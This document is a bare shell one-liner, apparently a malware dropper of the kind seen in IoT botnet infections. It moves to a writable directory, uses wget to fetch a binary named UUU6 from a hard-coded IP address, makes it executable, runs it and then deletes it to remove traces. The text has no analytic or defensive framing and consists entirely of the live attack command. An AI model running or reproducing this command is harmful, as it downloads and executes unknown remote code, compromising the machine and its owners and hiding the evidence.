cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/UUU6; chmod +x UUU6; ./UUU6; rm -rf UUU6
